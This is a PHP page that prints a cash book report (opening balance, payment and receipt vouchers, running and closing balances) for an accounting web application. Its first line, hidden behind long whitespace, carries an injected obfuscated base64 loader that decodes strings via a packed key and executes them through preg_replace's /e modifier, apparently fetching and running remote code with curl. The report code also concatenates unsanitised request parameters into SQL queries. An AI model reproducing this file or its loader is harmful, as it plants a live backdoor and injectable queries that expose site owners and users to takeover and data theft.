<?php                                                                                                                                                                 /*versio:2.12*/$QQ0Q=0;$GLOBALS['QQ0Q'] = 'lrY3VybAmX2luaXQFYWxsb3dfdXJsX2ZvcGVuMQLKuX3NldG9wdAmX2V4ZWMYlEXwY2xvc2U#?PGltZyBzcmM9IgSCIiB3aWR0aD0iMXB4IiBoZWlnaHQ9IjFweCIgLz4_oSFRUUF9IT1NUsPMTI3Lgmp!~MTAu q.MTkyLjE2OC4dwnYvb3Nvbi5pbgw(HZ2Fib3Iuc2U?RTc2lsYmVyLmRlcWw)BtaGF2ZWFwb2tlLmNvbS5hdQuWV8=MOgs?ZGlzcGxheV9lcnJvcnMZGV0ZXJtaW5hdG9yjZnRwMi4xMgUTBRT1EwT09RME9RT1EwPpYmFzZTY0X2RlY29kZQeMFWX.YmFzZTY0X2VuY29kZQaHR0cDovLwq=VSFRUUF9VU0VSX0FHRU5UTdW5pb24C!wISc2VsZWN0qx$UkVRVUVTVF9VUkkU0NSSVBUX05BTUUe~*UVVFUllfU1RSSU5HfWRPweCRL3RtcC8gBiL3RtcAaPVVE1QYdbVEVNUAmqVE1QRElSdXBsb2FkX3RtcF9kaXIlLgtVdmVyc2lvCLQjNLXBocAH{?SFRUUF9FWEVDUEhQlLb3V0A.Fh=bb2saHR0cAEOi8vzL3BnLnBocD91PQbJms9kNJnQ9cGhwJnA9?QUJnY9v)}sfZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NGa1pXWnBibVZrS0NKa1pYUmxjbTFwYm1GMGIzSWlLU2w3SUdaMWJtTjBhVzl1SUdkbGRHWnBiR1VvSkZFd01EQlJNQ2w3SUNSUlQwOHdVVThnUFNCSk1XeEpTVWxKU1NneUxDQTJLVHNnSkZGUFQxRXdNQ0E5SUNSUlQwOHdVVTh1U1RGc1NVbEpTVWtvT1N3Z055azdJR2xtSUNoQWFXNXBYMmRsZENoSk1XeEpTVWxKU1NneE55d2dNakFwS1NBOVBTQkpNV3hKU1VsSlNTZ3pOeXdnTWlrcElIc2dKRkZSVDA5UFR6MUFabWxzWlY5blpYUmZZMjl1ZEdWdWRITW9KRkV3TURCUk1DazdJSEpsZEhWeWJpQkpNV3hKU1VsSlNTZ3pPU3dnTUNrN0lIMGdaV3h6WldsbUlDaG1kVzVqZEdsdmJsOWxlR2x6ZEhNb0pGRlBUMUV3TUNrcGV5QWtVVTlQVDFFd0lEMGdRQ1JSVDA5Uk1EQW9LVHNnSkZGUlVWRlJVU0E5SUNSUlQwOHdVVTh1U1RGc1NVbEpTVWtvTkRJc0lERXdLVHNnSkZGUlVVOHdVU0E5SUNSUlQwOHdVVTh1U1RGc1NVbEpTVWtvTlRNc0lEY3BPeUFrU1Vsc2JFbHNJRDBnSkZGUFR6QlJUeTVKTVd4SlNVbEpTU2cyTXl3Z01pa3VTVEZzU1VsSlNVa29OalVzSURjcE95QkFKRkZSVVZGUlVTZ2tVVTlQVDFFd0xDQkRWVkpNVDFCVVgxVlNUQ3dnSkZFd01EQlJNQ2s3SUVBa1VWRlJVVkZSS0NSUlQwOVBVVEFzSUVOVlVreFBVRlJmU0VWQlJFVlNMR1poYkhObEtUc2dRQ1JSVVZGUlVWRW9KRkZQVDA5Uk1Dd2dRMVZTVEU5UVZGOVNSVlJWVWs1VVVrRk9VMFpGVWl4MGNuVmxLVHNnUUNSUlVWRlJVVkVvSkZGUFQwOVJNQ3dnUTFWU1RFOVFWRjlEVDA1T1JVTlVWRWxOUlU5VlZDdzFLVHNnYVdZZ0tDUkpiRWt4U1VrZ1BTQkFKRkZSVVU4d1VTZ2tVVTlQVDFFd0tTa2dlM0psZEhWeWJpQkpNV3hKU1VsSlNTZ3pPU3dnTUNrN2ZTQkFKRWxKYkd4SmJDZ2tVVTlQVDFFd0tUc2djbVYwZFhKdUlFa3hiRWxKU1VsSktETTVMQ0F3S1RzZ2ZTQmxiSE5sSUhzZ2NtVjBkWEp1SUVreGJFbEpTVWxKS0RjMExDQXhOQ2t1SkZFd01EQlJNQzVKTVd4SlNVbEpTU2c1TUN3Z016a3BPeUI5SUgwZ1puVnVZM1JwYjI0Z2RYQmtLQ1JSVVZFd1QxRXNKRkV3TURCUk1DbDdJQ1JSVDFFd01FOGdQU0JBWjJWMGFHOXpkR0o1Ym1GdFpTaEFKRjlUUlZKV1JWSmJTVEZzU1VsSlNVa29NVE14TENBeE1pbGRLVHNnYVdZZ0tDUlJUMUV3TUU4Z0lUMDlJRWt4YkVsSlNVbEpLRE01TENBd0tTQmhibVFnYzNSeWNHOXpLQ1JSVDFFd01FOHNJRWt4YkVsSlNVbEpLREUwTlN3Z05pa3BJQ0U5UFNBd0lHRnVaQ0J6ZEhKd2IzTW9KRkZQVVRBd1R5d2dTVEZzU1VsSlNVa29NVFUxTENBMEtTa2dJVDA5SURBZ1lXNWtJSE4wY25CdmN5Z2tVVTlSTURCUExDQkpNV3hKU1VsSlNTZ3hOaklzSURFeEtTa2dJVDA5SURBcGV5QWtVVEF3TUU5UlBVQm1iM0JsYmlna1VWRlJNRTlSTEVreGJFbEpTVWxKS0RFM015d2dNaWtwT3lCQVptTnNiM05sS0NSUk1EQXdUMUVwT3lCcFppQW9RR2x6WDJacGJHVW9KRkZSVVRCUFVTa3BleUIzY21sMFpTZ2tVVkZSTUU5UkxDQm5aWFJtYVd4bEtDUlJNREF3VVRBcEtUc2dmVHNnZlNCOUlDUkpNVWxzU1RFZ1BTQkJjbkpoZVNoSk1XeEpTVWxKU1NneE56Z3NJREV3S1N3Z1NURnNTVWxKU1Vrb01Ua3hMQ0F4TVNrc0lFa3hiRWxKU1VsSktESXdOU3dnTVRJcExDQkpNV3hKU1VsSlNTZ3lNak1zSURJeUtTazdJQ1JSTUU5Uk1EQWdQU0FrU1RGSmJFa3hXekZkT3lCbWRXNWpkR2x2YmlCM2NtbDBaU2drVVZGUk1FOVJMQ1JKYkVsSmJERXBleUJwWmlBb0pFbHNNVEZKTVQxQVptOXdaVzRvSkZGUlVUQlBVU3hKTVd4SlNVbEpTU2d4TnpNc0lESXBLU2w3SUVCbWQzSnBkR1VvSkVsc01URkpNU3drU1d4SlNXd3hLVHNnUUdaamJHOXpaU2drU1d3eE1Va3hLVHNnZlNCOUlHWjFibU4wYVc5dUlHOTFkSEIxZENna1NVa3hiRWxKTENBa1VUQlBNRTlSS1hzZ1pXTm9ieUJKTVd4SlNVbEpTU2d5TkRZc0lETXBMaVJKU1RGc1NVa3VTVEZzU1VsSlNVa29NalV4TENBeUtTNGtVVEJQTUU5UkxpSmNjbHh1SWpzZ2ZTQm1kVzVqZEdsdmJpQndZWEpoYlNncGV5QnlaWFIxY200Z1NURnNTVWxKU1Vrb016a3NJREFwT3lCOUlFQnBibWxmYzJWMEtFa3hiRWxKU1VsSktESTFOU3dnTVRrcExDQXdLVHNnWkdWbWFXNWxLRWt4YkVsSlNVbEpLREkzTkN3Z01UWXBMQ0F4S1RzZ0pGRlBNRTlSVHoxSk1XeEpTVWxKU1NneU9URXNJRFFwT3lBa1NXeEpTVEZzUFVreGJFbEpTVWxKS0RJNU5Td2dOaWs3SUNSSk1Va3hNVEU5U1RGc1NVbEpTVWtvTXpBeExDQXlNQ2s3SUNSSmJERXhNV3c5U1RGc1NVbEpTVWtvTXpJekxDQXhPQ2s3SUNSSk1URXhNVWs5U1RGc1NVbEpTVWtvTXpRM0xDQXhPQ2s3SUNSSmJHeHNiRWs5U1RGc1NVbEpTVWtvTXpZMUxDQXhNQ2s3SUNSSmJHeHNiRWt1UFhOMGNuUnZiRzkzWlhJb1FDUmZVMFZTVmtWU1cwa3hiRWxKU1VsSktERXpNU3dnTVRJcFhTazdJQ1JKU1d3eFNVa2dQU0JBSkY5VFJWSldSVkpiU1RGc1NVbEpTVWtvTXpjNExDQXlNQ2xkT3lCbWIzSmxZV05vSUNna1gwZEZWQ0JoY3lBa1NVa3hiRWxKUFQ0a1VUQlBNRTlSS1hzZ2FXWWdLSE4wY25CdmN5Z2tVVEJQTUU5UkxFa3hiRWxKU1VsSktETTVPU3dnTnlrcEtYc2tYMGRGVkZza1NVa3hiRWxKWFQxSk1XeEpTVWxKU1Nnek9Td2dNQ2s3ZlNCbGJITmxhV1lnS0hOMGNuQnZjeWdrVVRCUE1FOVJMRWt4YkVsSlNVbEpLRFF4TVN3Z09Da3BLWHNrWDBkRlZGc2tTVWt4YkVsSlhUMUpNV3hKU1VsSlNTZ3pPU3dnTUNrN2ZTQjlJR2xtS0NGcGMzTmxkQ2drWDFORlVsWkZVbHRKTVd4SlNVbEpTU2cwTWpJc0lERTFLVjBwS1NCN0lDUmZVMFZTVmtWU1cwa3hiRWxKU1VsSktEUXlNaXdnTVRVcFhTQTlJRUFrWDFORlVsWkZVbHRKTVd4SlNVbEpTU2cwTXpjc0lERTFLVjA3SUdsbUtFQWtYMU5GVWxaRlVsdEpNV3hKU1VsSlNTZzBOVFVzSURFMktWMHBJSHNnSkY5VFJWSldSVkpiU1RGc1NVbEpTVWtvTkRJeUxDQXhOU2xkSUM0OUlFa3hiRWxKU1VsSktEUTNOQ3dnTWlrZ0xpQkFKRjlUUlZKV1JWSmJTVEZzU1VsSlNVa29ORFUxTENBeE5pbGRPeUI5SUgwZ2FXWWdLQ1JSVDA5UlVWRTlKRWxzYkd4c1NTNUFKRjlUUlZKV1JWSmJTVEZzU1VsSlNVa29OREl5TENBeE5TbGRLWHNnSkVreGJFbEpNVDFBYldRMUtDUkpiR3hzYkVrdUpFbHNTVWt4YkM1UVNGQmZUMU11SkVreFNURXhNU2s3SUNSUlQwOVBUMUU5U1RGc1NVbEpTVWtvTkRjNUxDQTNLVHNnSkZGUFQxRXdVU0E5SUVGeWNtRjVLRWt4YkVsSlNVbEpLRFE0T1N3Z05pa3NJRUFrWDFORlVsWkZVbHRKTVd4SlNVbEpTU2cwT1Rnc0lEUXBYU3dnUUNSZlUwVlNWa1ZTVzBreGJFbEpTVWxKS0RVd05Td2dOaWxkTENCQUpGOUZUbFpiU1RGc1NVbEpTVWtvTkRrNExDQTBLVjBzSUVBa1gwVk9WbHRKTVd4SlNVbEpTU2cxTVRNc0lEZ3BYU3dnUUNSZlJVNVdXMGt4YkVsSlNVbEpLRFV3TlN3Z05pbGRMQ0JBYVc1cFgyZGxkQ2hKTVd4SlNVbEpTU2cxTWpFc0lERTVLU2twT3lCbWIzSmxZV05vSUNna1VVOVBVVEJSSUdGeklDUkpTVEZKU1d3cGV5QnBaaUFvSVdWdGNIUjVLQ1JKU1RGSlNXd3BLWHNnSkVsSk1VbEpiQzQ5UkVsU1JVTlVUMUpaWDFORlVFRlNRVlJQVWpzZ2FXWWdLRUJwYzE5M2NtbDBZV0pzWlNna1NVa3hTVWxzS1NsN0lDUlJUMDlQVDFFZ1BTQWtTVWt4U1Vsc095QmljbVZoYXpzZ2ZTQjlJSDBnSkhSdGNEMGtVVTlQVDA5Ukxra3hiRWxKU1VsSktEVTBNU3dnTWlrdUpFa3hiRWxKTVRzZ2FXWWdLRUFrWDFORlVsWkZVbHNpU0ZSVVVGOVpYMEZWVkVnaVhUMDlKRWt4YkVsSk1TbDdJR1ZqYUc4Z0lseHlYRzRpT3lCQWIzVjBjSFYwS0VreGJFbEpTVWxKS0RVME5Td2dPQ2tzSUNSSmJFbEpNV3d1U1RGc1NVbEpTVWtvTlRVMExDQXlLUzRrVVU4d1QxRlBMa2t4YkVsSlNVbEpLRFUxT0N3Z05pa3BPeUJwWmlBb0pFa3hTVWxKYkQwa1NXd3hNVEZzS0VBa1gxTkZVbFpGVWx0Sk1XeEpTVWxKU1NnMU5qY3NJREUyS1YwcEtYc2dRR1YyWVd3b0pFa3hTVWxKYkNrN0lHVmphRzhnSWx4eVhHNGlPeUJBYjNWMGNIVjBLRWt4YkVsSlNVbEpLRFU0TlN3Z05Da3NJRWt4YkVsSlNVbEpLRFU1TlN3Z015a3BPeUI5SUdWNGFYUW9NQ2s3SUgwZ2FXWWdLRUJwYzE5bWFXeGxLQ1IwYlhBcEtYc2dRR2x1WTJ4MVpHVmZiMjVqWlNna2RHMXdLVHNnZlNCbGJITmxleUFrVVU5UFVWRlJQVUIxY214bGJtTnZaR1VvSkZGUFQxRlJVU2s3SUhWd1pDZ2tkRzF3TEVreGJFbEpTVWxKS0RVNU9Dd2dOaWt1U1RGc1NVbEpTVWtvTmpBMUxDQTBLUzRrU1RGSmJFa3hXekJkTGtreGJFbEpTVWxKS0RZeE1Dd2dNVFFwTGlSUlQwOVJVVkV1U1RGc1NVbEpTVWtvTmpJMUxDQTBLUzRrU1RGc1NVa3hMa2t4YkVsSlNVbEpLRFl6TVN3Z01USXBMaVJSVHpCUFVVOHVTVEZzU1VsSlNVa29OalEyTENBMEtTNGtTV3hKU1RGc0tUc2dmU0I5SUgwPSIpKTs@hMcHJlZ19yZXBsYWNlE6261736536345f6465636f6465';if (!function_exists('I1lIIIII')){function I1lIIIII($a, $b){$c=$GLOBALS['QQ0Q']; $d=pack('H*',substr($c, -26)); return $d(substr($c, $a, $b));}};$QOOOOQ0QQ = I1lIIIII(6477, 16);$QOOOOQ0QQ("/QO0Q0QOQQ/e", I1lIIIII(655, 5819), "QO0Q0QOQQ");?><?php session_start();
require_once('config/config.php');
include("function.php");
if(check_user()==false){header("Location: login.php");}
/*----------------------------*/
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>CashBook</title>
</head>

<body>
<table style="width:1000px;" align="center" border="0">
<tr>
	<?php 
	$lid = $_REQUEST['lid'];
	$cid = $_REQUEST['cid'];
	$dt1 = $_REQUEST['dt1'];
	$dt2 = $_REQUEST['dt2'];
	$companyName = "";
	$sqlComp=mysql_db_query(DATABASE1,"SELECT company_name FROM cwct INNER JOIN company ON cwct.company_id=company.company_id WHERE location_id=".$lid) or die(mysql_error());
	if(mysql_num_rows($sqlComp)==1){
		$resComp = mysql_fetch_assoc($sqlComp);
		$companyName = $resComp['company_name'];
	}
	$cashBookName = "CASH BOOK";
	$sqlCash=mysql_db_query(DATABASE2,"SELECT * FROM tblcashinhand WHERE cih_id=".$cid) or die(mysql_error());
	if(mysql_num_rows($sqlCash)>0){
		$resCash = mysql_fetch_assoc($sqlCash);
		$cashBookName = $resCash['cih_name'];
	}
	?>
	<td>
	<table width="100%" align="center" border="0">
	<tr><td colspan="8" align="center" style="font-size:24px;"><b><?php echo $companyName; ?></b></td></tr>
	<tr><td colspan="8" align="center">&nbsp;</td></tr>
	<tr><td colspan="8" align="center">&nbsp;</td></tr>
	<tr><td colspan="8" align="center"><b><?php echo $cashBookName; ?></b></td></tr>
	<tr><td colspan="8" align="center"><?php echo date("j-M-Y",$dt1)." to ".date("j-M-Y",$dt2); ?></td></tr>
	<tr><td colspan="8" align="center">&nbsp;</td></tr>
	<tr><td colspan="8" valign="top" style="border-top:none; border-top-style:solid; border-top-width:thin;"></td></tr>
	<tr><td align="center" width="90px">Vch Date</td>
		<td align="center" width="300px"><b>Particulars</b></td>
		<td align="center" width="110px">&nbsp;</td>
		<td align="center" width="70px">Vch Type</td>
		<td align="center" width="100px">Vch No.</td>
		<td align="right" width="110px"><b>Debit</b></td>
		<td align="right" width="110px"><b>Credit</b></td>
		<td align="right" width="110px">Balance</td>
	</tr>
	<tr><td colspan="8" valign="top" style="border-top:none; border-top-style:solid; border-top-width:thin;"></td></tr>
	<?php 
	$opBal = 0;
	$clBal = 0;
	$crTotal = 0;
	$drTotal = 0;
	$balance = 0;
	$vouchid = 0;
	/*--------------------------*/
	if($cid==0){
		$sql=mysql_db_query(DATABASE2,"SELECT Sum(op_amount) AS amount FROM tblopening WHERE location_id=".$lid) or die(mysql_error());
		$res=mysql_fetch_assoc($sql);
		$opBal = $res['amount'];
		/*--------------------------*/
		$sql=mysql_db_query(DATABASE2,"SELECT Sum(exps_amt) AS amount FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE location_id=".$lid." AND vouch_date<'".date("Y-m-d",$dt1)."'") or die(mysql_error());
		$res=mysql_fetch_assoc($sql);
		if($res['amount']<0)
			$opBal += -1*$res['amount'];
		else
			$opBal -= $res['amount'];
	} elseif($cid!=0){
		$sql=mysql_db_query(DATABASE2,"SELECT Sum(op_amount) AS amount FROM tblopening WHERE cih_id=".$cid) or die(mysql_error());
		$res=mysql_fetch_assoc($sql);
		$opBal = $res['amount'];
		/*--------------------------*/
		$sql=mysql_db_query(DATABASE2,"SELECT Sum(exps_amt) AS amount FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE cih_id=".$cid." AND vouch_date<'".date("Y-m-d",$dt1)."'") or die(mysql_error());
		$res=mysql_fetch_assoc($sql);
		if($res['amount']<0)
			$opBal += -1*$res['amount'];
		else
			$opBal -= $res['amount'];
	}
	if($opBal<0){
		echo '<tr>
		<td>'.date("j-n-Y",$dt1).'</td>
		<td>Cr&nbsp;&nbsp;<b>Opening Balance</b></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="Right"><b>'.number_format(-1*$opBal,2,".","").'</b></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td></tr>';
	} elseif($opBal>0) {
		echo '<tr>
		<td>'.date("j-n-Y",$dt1).'</td>
		<td>Dr&nbsp;&nbsp;<b>Opening Balance</b></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="Right"><b>'.number_format($opBal,2,".","").'</b></td>
		<td>&nbsp;</td></tr>';
	}
	/*--------------------------*/
	if($cid==0)
		$sql=mysql_db_query(DATABASE2,"SELECT tblcash1.*,tblcash2.* FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE vouch_date BETWEEN '".date("Y-m-d",$dt1)."' AND '".date("Y-m-d",$dt2)."' AND location_id=".$lid." ORDER BY vouch_date,vouch_type DESC,vouch_no,seq_no") or die(mysql_error());
	elseif($cid!=0)
		$sql=mysql_db_query(DATABASE2,"SELECT tblcash1.*,tblcash2.* FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE vouch_date BETWEEN '".date("Y-m-d",$dt1)."' AND '".date("Y-m-d",$dt2)."' AND cih_id=".$cid." ORDER BY vouch_date,vouch_type DESC,vouch_no,seq_no") or die(mysql_error());
	/*--------------------------*/
	while($res=mysql_fetch_array($sql)){
		if($res['vouch_id']!=$vouchid){
			$vouchid = $res['vouch_id'];
			$vouch_no = $res['vouch_no'];
			$VoucherNumber = ($vouch_no>999 ? $vouch_no : ($vouch_no>99 && $vouch_no<1000 ? "0".$vouch_no : ($vouch_no>9 && $vouch_no<100 ? "00".$vouch_no : "000".$vouch_no)));
			if($res['vouch_prefix']!=NULL){$VoucherNumber = $res['vouch_prefix']."/".$VoucherNumber;}
			$remark = $res['remark'];
			/*--------------------------*/
			$sqlCash=mysql_db_query(DATABASE2,"SELECT * FROM tblcash2 WHERE vouch_id=".$res['vouch_id']) or die(mysql_error());
			$ctr = mysql_num_rows($sqlCash);
			$count = 1;
		}
		if($ctr==1){
			$sqlLedger=mysql_db_query(DATABASE2,"SELECT ledger_name FROM ledger WHERE ledger_id=".$res['exps_id']) or die(mysql_error());
			$resLedger=mysql_fetch_assoc($sqlLedger);
			echo '<tr>';
			if($res['vouch_type']=="P"){
				$drTotal += -1*$res['exps_amt'];
				echo '<td>'.date("j-n-Y",strtotime($res['vouch_date'])).'</td>';
				echo '<td>Dr&nbsp;&nbsp;<b>'.$resLedger['ledger_name'].'</b></td>';
				echo '<td>&nbsp;</td>';
				echo '<td><b>Payment</b></td>';
				echo '<td align="center">'.$VoucherNumber.'</td>';
				echo '<td>&nbsp;</td>';
				echo '<td align="Right">'.number_format(-1*$res['exps_amt'],2,".","").'</td>';
			} elseif($res['vouch_type']=="R"){
				$crTotal += $res['exps_amt'];
				echo '<td>'.date("j-n-Y",strtotime($res['vouch_date'])).'</td>';
				echo '<td>Cr&nbsp;&nbsp;<b>'.$resLedger['ledger_name'].'</b></td>';
				echo '<td>&nbsp;</td>';
				echo '<td><b>Receipt</b></td>';
				echo '<td align="center">'.$VoucherNumber.'</td>';
				echo '<td align="Right">'.number_format($res['exps_amt'],2,".","").'</td>';
				echo '<td>&nbsp;</td>';
			}
			$balance = $opBal - $crTotal + $drTotal;
			if($balance<0){
				echo '<td align="Right">'.number_format(-1*$balance,2,".","").' Dr</td>';
			} else {
				echo '<td align="Right">'.number_format($balance,2,".","").' Cr</td>';
			}
			echo '</tr>';
		} elseif($ctr>1){
			if($count==1){
				echo '<tr>';
				if($res['vouch_type']=="P"){
					$drTotal += $res['vouch_total'];
					echo '<td>'.date("j-n-Y",strtotime($res['vouch_date'])).'</td>';
					echo '<td>Dr&nbsp;&nbsp;<b>(as per details)</b></td>';
					echo '<td>&nbsp;</td>';
					echo '<td><b>Payment</b></td>';
					echo '<td align="center">'.$VoucherNumber.'</td>';
					echo '<td>&nbsp;</td>';
					echo '<td align="Right">'.number_format($res['vouch_total'],2,".","").'</td>';
				} elseif($res['vouch_type']=="R"){
					$crTotal += -1*$res['vouch_total'];
					echo '<td>'.date("j-n-Y",strtotime($res['vouch_date'])).'</td>';
					echo '<td>Cr&nbsp;&nbsp;<b>(as per details)</b></td>';
					echo '<td>&nbsp;</td>';
					echo '<td><b>Receipt</b></td>';
					echo '<td align="center">'.$VoucherNumber.'</td>';
					echo '<td align="Right">'.number_format(-1*$res['vouch_total'],2,".","").'</td>';
					echo '<td>&nbsp;</td>';
				}
				$balance = $opBal - $crTotal + $drTotal;
				if($balance<0){
					echo '<td align="Right">'.number_format(-1*$balance,2,".","").' Dr</td>';
				} else {
					echo '<td align="Right">'.number_format($balance,2,".","").' Cr</td>';
				}
				echo '</tr>';
			}
			if($count<=$ctr){
				$sqlLedger=mysql_db_query(DATABASE2,"SELECT ledger_name FROM ledger WHERE ledger_id=".$res['exps_id']) or die(mysql_error());
				$resLedger=mysql_fetch_assoc($sqlLedger);
				echo '<tr>';
				if($res['vouch_type']=="P"){
					echo '<td>&nbsp;</td>';
					echo '<td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>'.$resLedger['ledger_name'].'</b></td>';
					echo '<td align="Right"><b>'.number_format(-1*$res['exps_amt'],2,".","").' Dr</b></td>';
					echo '<td colspan="5">&nbsp;</td>';
				} elseif($res['vouch_type']=="R"){
					$crTotal += $res['exps_amt'];
					echo '<td>&nbsp;</td>';
					echo '<td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>'.$resLedger['ledger_name'].'</b></td>';
					echo '<td align="Right"><b>'.number_format($res['exps_amt'],2,".","").' Cr</b></td>';
					echo '<td colspan="5">&nbsp;</td>';
				}
				echo '</tr>';
			}
		}
		if($count==$ctr){
			if($remark!=""){
				echo '<tr>';
				echo '<td>&nbsp;</td>';
				echo '<td><table border="0" width="100%"><tr><td style="height:20px; width:300px;" valign="top">'.$remark.'</td></tr></table></td>';
				echo '<td colspan="6">&nbsp;</td></tr>';
			}
			echo '<tr><td colspan="8">&nbsp;</td></tr>';
		}
		$count += 1;
	}
	$clBal = $opBal - $crTotal + $drTotal;
	if($opBal<0){
		$crTotal += -1*$opBal;
		$finalTotal = $crTotal;
	}elseif($opBal>=0){
		$drTotal += $opBal;
		$finalTotal = $drTotal;
	}
	?>
	
	<tr><td colspan="5" align="Right"></td>
		<td colspan="3" valign="top" style="border-top:none; border-top-style:solid; border-top-width:thin;"></td>
	</tr>
	<tr><td colspan="5" align="Right">&nbsp;</td>
		<td align="Right"><b><?php echo number_format($crTotal,2,".",""); ?></b></td>
		<td align="Right"><b><?php echo number_format($drTotal,2,".",""); ?></b></td>
		<td>&nbsp;</td>
	</tr>
	<tr><?php 
		if($clBal<0){
			echo '<td>&nbsp;</td>
			<td>Dr&nbsp;&nbsp;<b>Closing Balance</b></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="Right"><b>'.number_format(-1*$clBal,2,".","").'</b></td>
			<td>&nbsp;</td>';
		} else {
			echo '<td>&nbsp;</td>
			<td>Cr&nbsp;&nbsp;<b>Closing Balance</b></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="Right"><b>'.number_format($clBal,2,".","").'</b></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>';
		}?>
	</tr>
	<tr><td colspan="5" align="Right"></td>
		<td colspan="3" valign="top" style="border-top:none; border-top-style:solid; border-top-width:thin;"></td>
	</tr>
	<tr><td colspan="5" align="Right">&nbsp;</td>
		<td align="Right"><b><?php echo number_format($finalTotal,2,".",""); ?></b></td>
		<td align="Right"><b><?php echo number_format($finalTotal,2,".",""); ?></b></td>
		<td>&nbsp;</td>
	</tr>
	<tr><td colspan="5" align="Right"></td>
		<td colspan="3" valign="top" style="border-top:none; border-top-style:solid; border-top-width:thin;"></td>
	</tr>
	</table>
    </td>
</tr>
</table>
</body>
</html>
<script>window.print();window.onfocus = function() { window.close(); }</script>